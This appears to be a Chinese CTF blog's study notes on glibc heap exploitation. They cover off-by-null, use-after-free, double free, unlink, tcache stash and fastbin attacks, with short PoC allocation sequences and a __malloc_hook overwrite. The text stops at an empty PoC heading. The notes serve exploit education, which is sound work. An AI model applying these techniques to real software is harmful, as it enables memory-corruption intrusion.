<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">puts_offset = libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_offset = libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">printf_offset = libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_offset      ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(puts_offset))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;read_offset     ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(read_offset))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;printf_offset   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(printf_offset))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">puts_offset     ---&gt;    0x84420</span></span><br><span class="line"><span class="string">read_offset     ---&gt;    0x10dfc0</span></span><br><span class="line"><span class="string">printf_offset   ---&gt;    0x61c90</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># puts    ---&gt;    420</span></span><br><span class="line"><span class="string"># read    ---&gt;    fc0</span></span><br><span class="line"><span class="string"># printf  ---&gt;    c90</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>将打印出来的三个偏移量的后三位，拿到 <a
href="https://libc.blukat.me/?q=puts%3A420%2Cread%3Afc0%2Cprintf%3Ac90">libcSearcher</a>
去查即可</p>
<h2 id="libc-包的下载">[1-2] libc 包的下载</h2>
<p>patchelf没有的包可以在<a
href="https://www.jianshu.com/p/1a966b62b3d4">这里</a>下载</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">以下操作均在文件夹 glibc-all-in-one 中完成</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看有什么版本的 libc 可以下载</span></span><br><span class="line">./update_list // 更新 list</span><br><span class="line">cat list</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载所需要的 libc 包</span></span><br><span class="line">./download 2.35-0ubuntu3_amd64</span><br></pre></td></tr></table></figure>
<blockquote>
<p>有时我们需要的 libc 包不在 list
中，我们可以自己尝试解构命令来下载。</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">访问https://mirror.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/，查看所有可以下载的 libc 版本</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">http://archive.ubuntu.com/ubuntu/pool/main/g/glibc/ 也可以</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载压缩包(到文件夹glibc-all-in-one/debs)以后用 extract 命令解压缩</span></span><br><span class="line">./extract debs/libc6_2.26-0ubuntu2_i386.deb /tmp/test</span><br></pre></td></tr></table></figure>
<h2 id="patch-elf文件">[1-3] patch elf文件</h2>
<blockquote>
<p>识别需要 patch 的文件 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[path/to/glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64]</span><br><span class="line">└─$ ls</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">找到以下文件</span><br><span class="line">ld-linux-x86-64.so.2  # ld-2.23.so 也行</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p>tip1：高版本的libc库没有 <code>ld-2.23.so</code> 这种文件，但它与
<code>ld-linux-x86-64.so.2</code>
等价，都指向相同的动态链接器文件，他们实际上是同一个文件的不同名称。</p>
<p>tip2：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">被patch的elf文件: Pwn</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置动态链接器 ld.so</span></span><br><span class="line">patchelf --set-interpreter path/to/glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/ld-linux-x86-64.so.2 pwn </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置链接库</span> </span><br><span class="line">patchelf --set-rpath  path/to/glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/ pwn</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置动态链接器与动态链接库</span></span><br><span class="line">patchelf --set-interpreter ./glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/ld-2.23.so --replace-needed libc.so.6 ./glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/libc.so.6</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">最常用的命令</span></span><br><span class="line">patchelf --set-interpreter ./ld-2.31.so --replace-needed libc.so.6 ./libc-2.31.so pwn</span><br></pre></td></tr></table></figure>
<h2 id="恢复-debug-symbol">[1-4] 恢复 debug symbol</h2>
<h3 id="patchelf-list-中有相关包">[1-4-1] patchelf list 中有相关包</h3>
<blockquote>
<p>其实没有相关包的话用最近版本的 libc 也能.debug</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载对应 libc 包</span></span><br><span class="line">./download xxx</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">复制 /libs/2.xx-xubuntuxx_xxx/.debug/.build-id 的绝对路径，在gdb时</span></span><br><span class="line">loadfolder /path/to/libs/2.xx-xubuntuxx_xxx/.debug/.build-id</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果 download 拉不下来，去对应网站找带dbg（如libc6-dbg_2.23-0ubuntu3_i386.deb）的包下载下来，将/data/usr/lib/debug/.build-id复制到 /libs/2.xx-xubuntuxx_xxx/.debug 下即可</span></span><br></pre></td></tr></table></figure>
<h3 id="list-中没有相关包">[1-4-2] list 中没有相关包</h3>
<p>查看<a
href="https://www.jianshu.com/p/1a966b62b3d4">这个教程</a>编译源码来恢复符号</p>
<p><a href="https://www.cnblogs.com/LynneHuan/p/17822138.html">docker
恢复符号</a></p>
<h1 id="详解-申请与释放-chunk未完成">[2] 详解 '申请与释放
chunk'(未完成)</h1>
<h2 id="申请-chunk">[2-1] 申请 chunk</h2>
<ol start="0" type="1">
<li><p>如果是第一次申请，则 malloc 一块内存来存放
<code>tcache_perthread_struct</code></p></li>
<li><p>查看要申请的 chunk 的大小，记作 <code>SIZE</code></p></li>
<li><p>检查各种 bin</p>
<ol type="1">
<li>(libc2.26及之后) <code>SIZE</code> 属于 [0x0,small bin size)，检查
tcachebin，有合适的 chunk 则返回</li>
<li>根据版本有不同选择
<ol type="1">
<li>(libc2.26之前)<code>SIZE</code> 属于 [0x0,0x78]，检查
fastbins，有合适的 chunk 则检查 size 域是否正确，正确则返回</li>
<li>(libc2.26及之后)<code>SIZE</code> 属于 [0x0,0x78]，将对应 fastbin
一整条链挪进 tcachebin 的对应链上，并取出 newest_chunk 返回</li>
</ol></li>
<li>smallBin largeBin 还没学</li>
<li>检查 unsortedBin，如果 <code>SIZE</code> 小于 "unsortedbin 的某个
chunk 的 size"，则:
<ol type="1">
<li>以0x10为基本单位切割出申请的 chunk 并返回，剩下的部分叫做 last
remainder chunk</li>
</ol></li>
</ol></li>
<li><p>检查 topchunk，如果 <code>SIZE</code> 小于 "topchunk 的
size"，则:</p>
<ol type="1">
<li>以0x10为基本单位切割出申请的 chunk 并返回</li>
</ol></li>
<li><p>用 Brk 再拉几页内存出来，还没学</p></li>
</ol>
<h2 id="释放-chunk">[2-2] 释放 chunk</h2>
<ol type="1">
<li>查看要释放的 chunk 的大小，记作<code>SIZE</code></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 猜测，尚不确定</span><br><span class="line">n. 检查 prev_inuse 位，若为0，则:  </span><br><span class="line">    1. 如果 chunk 不在 fastbin/tcachebin，则前向合并，并继续递归检验 prev_inuse</span><br><span class="line">    2. 如果 chunk 在 fastbin/tcachebin，则获取前一个 chunk 的 size，并存到 prev_size 域</span><br></pre></td></tr></table></figure>
<h1 id="chunk-extend-and-overlapping">[3] chunk Extend and
Overlapping</h1>
<h2 id="分类">[3-1] 分类</h2>
<p>本质是通过修改 chunk_header 来实现用 chunk1 控制 chunk2
的内容的效果。分为前向和后向两种</p>
<h3 id="后向-overlap">[3-1-1] 后向 Overlap</h3>
<p>堆区模型： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---chunk1(0x21)---</span><br><span class="line">---chunk2(0x21)---</span><br></pre></td></tr></table></figure></p>
<p>本质：修改低地址 chunk1 的 size 域，在修改 chunk1 内容时会越界修改掉
chunk2 的内容</p>
<h3 id="前向-overlap">[3-1-2] 前向 Overlap</h3>
<p>堆区模型： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---chunk1(0x81)---</span><br><span class="line">---chunk2(0x21)---</span><br><span class="line">---chunk3(0x21)---</span><br><span class="line">---chunk4(0x81)---</span><br><span class="line">---chunk5(0x21)---防止 top_chunk 合并</span><br></pre></td></tr></table></figure></p>
<p>本质：修改高地址 chunk4 的 pre_inuse 域和 prev_size 域，通过 free 时
bins 的机制来进行前向合并 chunk1 ，从而再次 malloc 时可以控制中间的
chunk2 与 chunk3</p>
<h2 id="具体利用手法">[3-2] 具体利用手法</h2>
<h3 id="off-by-null">[3-2-1] off-by-null</h3>
<h4 id="概述">[3-2-1-1] 概述</h4>
<p><code>off-by-null</code>
指的是程序在写入堆的时候，会在输入字符的最后用<code>'\x00'</code>截断</p>
<p>通过申请 xxx8h 大小的 chunk，当我们输入 xxx8 个字节时，程序会将下一个
chunk 的 size 域的低一个字节覆盖为0，</p>
<p>这样的操作会让 prev_inuse 位置零，使程序误以为前一个 chunk
已经被释放，从而与前 n 个 chunk 发生合并</p>
<h4 id="poc">[3-2-1-2] POC</h4>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">0x80</span>) <span class="comment"># 0 0x91 </span></span><br><span class="line">alloc(<span class="number">0x18</span>) <span class="comment"># 1 0x21</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment"># 2 0x91</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment"># 3 0x21 防止合并</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0xb0</span>) <span class="comment"># 0x20 + 0x90 = 0xb0</span></span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># show(0) 可以 leak main_arena</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># alloc(4,0xa0) 可以切割 chunk0-chunk2，从而修改 chunk1，</span></span><br><span class="line"><span class="comment"># 进而造成 tcachebin poisoning / fastbin attack</span></span><br></pre></td></tr></table></figure>
<h1 id="use-after-free">[4] Use After Free</h1>
<h2 id="概述-1">[4-1] 概述</h2>
<blockquote>
<p>libc2.26 - libc2.31，主要是 tcachebin UAF</p>
</blockquote>
<p>见 Kinds of Bin -&gt; Tcachebin -&gt; UAF</p>
<h1 id="double-free">[5] Double Free</h1>
<h2 id="概述-2">[5-1] 概述</h2>
<blockquote>
<p>libc2.27之前，主要是 fastbin double free</p>
</blockquote>
<p>见 Kinds of Bin -&gt; Fastbin</p>
<blockquote>
<p>libc2.27-2.28，主要是 tcachebin double free</p>
</blockquote>
<blockquote>
<p>libc2.29-libc2.31，tcachebin加入了检查机制，所以仍然考虑用
fastbin/smallbin</p>
</blockquote>
<p>见 Kinds of Bin -&gt; Tcachebin</p>
<h1 id="unlink">[6] Unlink</h1>
<h2 id="利用条件">[6-1] 利用条件</h2>
<ol type="1">
<li><p>free 的 <code>chunkC</code> 前后 chunk 的 fd/bk 可以被修改</p>
<ol type="1">
<li><p>UAF，free 以后修改 fd/bk</p></li>
<li><p>堆溢出，伪造 chunk，修改 fd/bk 的同时修改 <code>chunk</code> 的
prev_size 和 prev_inuse</p></li>
</ol></li>
<li><p>没见过太多案例不太会概括这一点</p>
<ol type="1">
<li>pie 没开，bss 段的 heap_list 可以被拿来当做 fd/bk</li>
</ol></li>
</ol>
<h2 id="原理">[6-2] 原理</h2>
<p>ctfwiki 上的 FD BK fd bk 感觉写的乱七八糟的，重新整理一下思路</p>
<p>unlink 概括来讲，就是利用 free
时的机制，实现任意地址写非任意值的技术</p>
<h3 id="触发-unlink">[6-2-1] 触发 unlink</h3>
<ol type="1">
<li><p>在释放 size 大于 smallbin 最小值的 chunkC 时，ptmalloc 会检查
chunkC 物理相邻的前后两个 chunk
是否正在被使用，如果没被使用，则会触发前向/后向合并，从而触发 unlink</p>
<ol type="1">
<li><p>前向合并：chunkC 的 prev_size 为前一个 chunk 的 size，且 chunkC
的 prev_inuse 位置零</p></li>
<li><p>后向合并：chunkC 的后一个 chunk 已经在 binlist 当中</p></li>
</ol></li>
</ol>
<h3 id="古早版本">[6-2-2] 古早版本</h3>
<p>假设在一个双向链表 bin 中，有 BK &lt;=&gt; CUR &lt;=&gt; FD</p>
<p>三个 chunk 的关系为</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BK.fd == &amp;(CUR.prev_size)</span><br><span class="line">CUR.bk == &amp;(BK.prev_size)</span><br><span class="line">CUR.fd == &amp;(FD.prev_size)</span><br><span class="line">FD.bk == &amp;(CUR.prev_size)</span><br></pre></td></tr></table></figure>
<center>
<img src="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/implementation/figure/unlink_smallbin_intro.png" width=370 height=290 />
</center>
<p>在<strong>古早</strong>的版本中，unlink 的具体过程为
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">CUR.bk-&gt;fd = CUR.fd # CUR 的后一个 chunk 的 fd 指针指向 CUR 的前一个 chunk</span><br><span class="line">CUR.fd-&gt;bk = CUR.bk # CUR 的前一个 chunk 的 bk 指针指向 CUR 的后一个 chunk</span><br></pre></td></tr></table></figure></p>
<p>如果我们修改 CUR 的 fd 和 bk 指针，就可以实现
<code>Any address write</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SIZE 在32位为 4，64位为8</span></span><br><span class="line"><span class="comment">// target_addr + 0*SIZE = &amp;(fakechunk.prev_size)</span></span><br><span class="line"><span class="comment">// target_addr + 1*SIZE = &amp;(fakechunk.size)</span></span><br><span class="line"><span class="comment">// target_addr + 2*SIZE = &amp;(fakechunk.fd)</span></span><br><span class="line"><span class="comment">// target_addr + 3*SIZE = &amp;(fakechunk.bk)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改 CUR 的 fd 和 bk 指针</span></span><br><span class="line">CUR.fd = target_addr - <span class="number">3</span>*SIZE</span><br><span class="line">CUR.bk = expect_value</span><br><span class="line"></span><br><span class="line"><span class="comment">// CUR.fd-&gt;bk = CUR.bk</span></span><br><span class="line">*(target_addr - <span class="number">3</span>*SIZE + <span class="number">3</span>*SIZE) = expect_value + <span class="number">2</span>*SIZE</span><br><span class="line"></span><br><span class="line"><span class="comment">// CUR.bk-&gt;fd = CUR.fd   ---&gt;   要求 expect_value + 8 指向的内存可写</span></span><br><span class="line">*(expect_value + <span class="number">2</span>*SIZE) = target_addr - <span class="number">3</span>*SIZE</span><br></pre></td></tr></table></figure>
<h3 id="加入-check-以后">[6-2-3] 加入 check 以后</h3>
<ol type="1">
<li><p>check1</p>
<ol type="1">
<li><p>check <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">    malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br><span class="line"></span><br><span class="line"><span class="comment">// 省流版: </span></span><br><span class="line"><span class="comment">// CUR 的 fd 指向的 chunk 的 bk 必须存的是 CUR 的地址</span></span><br><span class="line"><span class="comment">// CUR 的 bk 指向的 chunk 的 fd 必须存的是 CUR 的地址</span></span><br><span class="line"><span class="keyword">if</span> ( !( CUR.fd-&gt;bk == &amp;(CUR.prev_size) &amp;&amp; CUR.bk-&gt;fd == &amp;(CUR.prev_size) ) )</span><br><span class="line">    malloc_printerr(...)</span><br></pre></td></tr></table></figure></p></li>
<li><p>bypass <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 让 CUR 的 fd 和 bk 指针都指向 CUR 自己</span></span><br><span class="line">CUR.fd = &amp;(CUR.prev_size)</span><br><span class="line">CUR.bk = &amp;(CUR.prev_size)</span><br><span class="line"></span><br><span class="line"><span class="comment">// check 时</span></span><br><span class="line">CUR.fd-&gt;bk = (&amp;(CUR.prev_size))-&gt;bk = CUR</span><br><span class="line">CUR.bk-&gt;fd = (&amp;(CUR.prev_size))-&gt;fd = CUR</span><br><span class="line"></span><br><span class="line"><span class="comment">// unlink</span></span><br><span class="line">CUR.fd-&gt;bk = (&amp;(CUR.prev_size))-&gt;bk = &amp;(CUR.prev_size) + <span class="number">2</span>*SIZE</span><br><span class="line">CUR.bk-&gt;fd = (&amp;(CUR.prev_size))-&gt;fd = &amp;(CUR.prev_size) - <span class="number">3</span>*SIZE</span><br></pre></td></tr></table></figure> 这样虽然不能实现任意地址写，但是也可以让
CUR 的 fd 和 bk 指针指向不正确的位置</p></li>
</ol></li>
</ol>
<h1 id="series-of-bin">[7] Series of Bin</h1>
<h2 id="tcachebin">[7-1] Tcachebin</h2>
<h3 id="概述-3">[7-1-1] 概述</h3>
<ol type="1">
<li>Tcachebin 为 LIFO 单向链表，如下</li>
</ol>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Tcachebin</span>: (头节点)<span class="title function_">newest_chunk</span>(first out) -&gt; ... </span><br><span class="line">    ... -&gt; (尾节点)<span class="title function_">oldest_chunk</span>(last out)</span><br></pre></td></tr></table></figure>
<h3 id="leak">[7-1-2] Leak</h3>
<h3 id="write">[7-1-3] Write</h3>
<h4 id="uaf">[7-1-3-1] UAF</h4>
<blockquote>
<p>Libc: 2.26 - 2.31</p>
</blockquote>
<blockquote>
<p>应用条件:</p>
</blockquote>
<ol type="1">
<li>UAF</li>
</ol>
<blockquote>
<p>相关特性:</p>
</blockquote>
<ol type="1">
<li>Tcachebin 跟筛子没什么区别，通过 UAF 修改 newest_chunk 的 fd 指针为
Any address，再通过两次 malloc 就可以在 Any address 处申请到一个 chunk
供我们使用</li>
</ol>
<blockquote>
<p>POC:</p>
</blockquote>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> alloc(chunk0)</span><br><span class="line">   alloc(chunk1)</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> free(chunk0)</span><br><span class="line">   free(chunk1)</span><br><span class="line"><span class="comment"># 做完这一步，tcachebin[size]: chunk1 -&gt; chunk0</span></span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> edit(chunk1,payload=address_to_malloc) </span><br><span class="line"><span class="comment"># 做完这一步，tcachebin[size]: chunk1 -&gt; address_to_malloc</span></span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> alloc(chunk2) <span class="comment"># chunk2 = chunk1</span></span><br><span class="line">   alloc(chunk3) <span class="comment"># chunk3 = address_to_malloc</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>例题:</p>
</blockquote>
<ol type="1">
<li><a href="">杭电hgame2024-week2 Elden Ring Ⅱ</a></li>
</ol>
<h4 id="stash-double-free">[7-1-3-2] Stash Double Free</h4>
<blockquote>
<p>Libc: 2.27 - 2.31</p>
</blockquote>
<blockquote>
<p>应用条件:</p>
</blockquote>
<ol type="1">
<li><p>7个 tcachebin chunk，2个 fastbin chunk，bins 构造完成后至少可以
alloc 10次</p></li>
<li><p>free 后还能再 free 同一个 chunk</p></li>
</ol>
<blockquote>
<p>相关特性:</p>
</blockquote>
<ol type="1">
<li><p>2.27之后，tcachebin 加入了 key 值检验，因此直接劫持 tcachebin
链比较困难(需要伪造 key 值)。</p></li>
<li><p>(具体是 stash 机制，我是按下面这样理解的)但当 tcachebin
某一条链的 chunk 全部取出，且对应大小的 fastbin 上仍有 chunk，ptmalloc
会将 fastbin 对应链上的全部 chunk 取出，并按 fastbin 顺序装载到
tcachebin 中。此时 ptmalloc 不会检测 fastbin 的全部 chunk 是否合法，并且
ptmalloc 还会为每个 chunk 构造合法 key 值，所以我们可以先劫持 fastbin
链，然后清空 tcachebin 后劫持 tcachebin 链。</p></li>
<li><p>在检查 key 值之后，从 tcachebin 中申请 chunk
的检测机制比较薄弱，不需要考虑 fd 指向的地址的 size 域是否合法</p></li>
</ol>
<blockquote>
<p>POC:</p>
</blockquote>
<ol type="1">
<li><p>申请9个同样大小的 chunk，依次释放，再释放一次 chunk7
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    alloc(i) <span class="comment"># 0-6 tcahcebin chunks || 7,8 fastbin chunks</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    free(i) </span><br><span class="line"></span><br><span class="line">free(<span class="number">7</span>) <span class="comment"># fastbin: chunk7 -&gt; chunk8 -&gt; chunk7</span></span><br></pre></td></tr></table></figure></p></li>
<li><p>申请7个 chunk，清空 tcachebin 链。再申请 chunk7，将 fastbin
中的所有 chunk 转移到 tcachebin 中. <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    alloc(i)</span><br><span class="line"></span><br><span class="line">alloc(idx=<span class="number">7</span>,content=address_to_alloc)</span><br><span class="line"><span class="comment"># 此时 tcachebin: chunk8 -&gt; chunk7 -&gt; address_to_alloc</span></span><br></pre></td></tr></table></figure></p></li>
<li><p>申请3个 chunk，此时我们就可以通过改变 chunk9 的值，来 write
任意位置了. <figure class="highlight py"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">8</span>)</span><br><span class="line">alloc(<span class="number">7</span>)</span><br><span class="line">alloc(<span class="number">9</span>,content=anything_to_write)</span><br></pre></td></tr></table></figure></p></li>
</ol>
<blockquote>
<p>例题:</p>
</blockquote>
<ol type="1">
<li><a href="">杭电hgame2024-week2 fastnote</a></li>
</ol>
<h2 id="fastbin">[7-2] Fastbin</h2>
<h3 id="概述-4">[7-2-1] 概述</h3>
<ol type="1">
<li>Fastbin 为 LIFO 单向链表，如下</li>
</ol>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="attr">fastbin</span>: (头节点)<span class="title function_">newest_chunk</span>(first out) -&gt; ... </span><br><span class="line">  ... -&gt; (尾节点)<span class="title function_">oldest_chunk</span>(last out)</span><br></pre></td></tr></table></figure>
<h3 id="leak-1">[7-2-2] Leak</h3>
<h3 id="write-1">[7-2-3] Write</h3>
<h4 id="double-free-1">[7-2-3-1] Double Free</h4>
<blockquote>
<p>Libc: 2.27之前</p>
</blockquote>
<blockquote>
<p>应用条件:</p>
</blockquote>
<ol type="1">
<li>free 后还能再 free 同一个 chunk</li>
</ol>
<blockquote>
<p>fastbin 相关特性:</p>
</blockquote>
<ol type="1">
<li><code>free</code>: 在 free chunk 到 fastbin 的过程中，会有以下
check：
<ol type="1">
<li>检测这个 chunk 和尾节点是否是同一个
chunk，如果是，则触发<code>Error in './vuln': double free or corruption (fasttop): 0x17170c0</code></li>
</ol></li>
<li><code>malloc</code>: 从 fastbin 申请 chunk 时，会有以下 check:
<ol type="1">
<li>检测这个 chunk 的 fd 指向的内存的 size 是否符合所属
fastbin，如果不属于，则触发<code>Error in './vuln': malloc(): memory corruption (fast): 0x7f4cf12d6afe</code></li>
</ol></li>
</ol>
<blockquote>
<p>POC:</p>
</blockquote>
<ol type="1">
<li><p>构建 fastbin: chunk1 -&gt; chunk2 -&gt; chunk1<br />
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">1</span>)</span><br><span class="line">alloc(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p></li>
<li><p>malloc(chunk1)，同时修改 chunk1 的 fd, 此时 fastbin 中构造为
chunk2 -&gt; chunk1 -&gt; address（address 有如下选择）</p>
<ol type="1">
<li>libc.sym['__malloc_hook'] - 0x23 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line">pd = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x23</span></span><br><span class="line"><span class="comment"># 注意不要把 &#x27;\n&#x27; 也当做 payload 传过去了</span></span><br><span class="line">alloc(<span class="number">1</span>,payload=pd)</span><br></pre></td></tr></table></figure></li>
</ol></li>
<li><p>malloc(chunk2), malloc(chunk1) <figure class="highlight py"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">2</span>)</span><br><span class="line">alloc(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p></li>
<li><p>malloc(address)，同时修改 address
处的内容，对应<code>'2.'</code>中的不同选择，有不同的填充方式</p>
<ol type="1">
<li>payload = b'a'*19 + one_gadget <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">mallochook-<span class="number">0x23</span>      prev_size      <span class="number">0x000000000000007f</span></span><br><span class="line">mallochook-<span class="number">0x13</span>  <span class="number">0x6161616161616161</span> <span class="number">0x6161616161616161</span></span><br><span class="line">mallochook-<span class="number">0x03</span>  0xXXXXXXXXXX616161 0x0000000000XXXXXX</span><br><span class="line">                            ^</span><br><span class="line">                            |</span><br><span class="line">                    正好是__malloc_hook的位置</span><br></pre></td></tr></table></figure></li>
</ol></li>
</ol>
<blockquote>
<p>例题</p>
</blockquote>
<ol type="1">
<li><p><a
href="https://heygap.github.io/2023/08/14/Pwn%20-%20Practice/#more">BUUCTF
babyheap_0ctf_2017</a></p></li>
<li><p><a href="">杭电hgame2024-week2 old_fastnote</a></p></li>
</ol>
<h2 id="unsortedbin">[7-3] Unsortedbin</h2>
<h3 id="leak-2">[7-3-1] leak</h3>
<blockquote>
<p>Libc: Any</p>
</blockquote>
<blockquote>
<p>应用条件:</p>
</blockquote>
<ol type="1">
<li><p>UAF</p></li>
<li><p>alloc 至少不会覆盖 bk</p></li>
</ol>
<p>当unsortedbin中有且仅有一个chunk时，</p>
<p>该chunk的fd和bk会指向 &amp;main_arena + 96，</p>
<p>貌似libc2.31是96，libc2.23是88，</p>
<p>具体做题用 pwndbg 看最低四位是 0x8 还是
0x0，0x8-&gt;88,0x0-&gt;96</p>
<p>而这个地址可以用ida查看对应libc的 malloc_trim 函数找到，从而帮助计算
libc_base.</p>
<p>当然这个地址也是 &amp;__malloc_hook + 0x10，具体看下面的代码注释.</p>
<p>如果我们把 unsortedbin 中唯一一个 chunk 记作 chunk0，则:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 内存中的 main_arena 地址，一般为0x7f...</span></span><br><span class="line">main_arena = chunk0.fd - <span class="number">0x60</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 libc 基址:</span></span><br><span class="line"><span class="comment"># main_arena 在 libc 中的偏移，正好等于 </span></span><br><span class="line"><span class="comment"># __malloc_hook 的偏移 + 0x10。</span></span><br><span class="line"><span class="comment"># 即 &amp;main_arena = &amp;__malloc_hook + 0x10。</span></span><br><span class="line">libc_base = main_arena - (ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>).sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] + <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 我们也可以直接用 IDA 打开 libc,</span></span><br><span class="line"><span class="comment"># 找到 __malloc_trim 函数,</span></span><br><span class="line"><span class="comment"># 直接在 22 行附近找到类似于</span></span><br><span class="line"><span class="comment"># _R15 = &amp;dword_1ECB80 的语句,</span></span><br><span class="line"><span class="comment"># 这里 main_arena 的偏移就是 0x1ECB80</span></span><br><span class="line">libc_base = main_arena - <span class="number">0x1ECB80</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>bypass</p>
</blockquote>
<ol type="1">
<li><code>ssize_t read(int fd, void *buf, size_t nbytes)</code>会用''填充不够
nbytes 的部分，因此我们在 <code>alloc</code> 或者 <code>edit</code>
的时候注意 nbytes = 0x08 即可，这样不会覆盖 bk 的 &amp;main_arena</li>
</ol>
<h3 id="write-2">[7-3-2] write</h3>
<h4 id="direct">[7-3-2-1] Direct</h4>
<blockquote>
<p>Libc: 2.23</p>
</blockquote>
<blockquote>
<p>相关特性:</p>
</blockquote>
<ol type="1">
<li>低 libc 版本的 unsortedbin 可以像 tcachebin
一样，通过伪造链来申请一个 fake_chunk</li>
</ol>
<blockquote>
<p>POC:</p>
</blockquote>
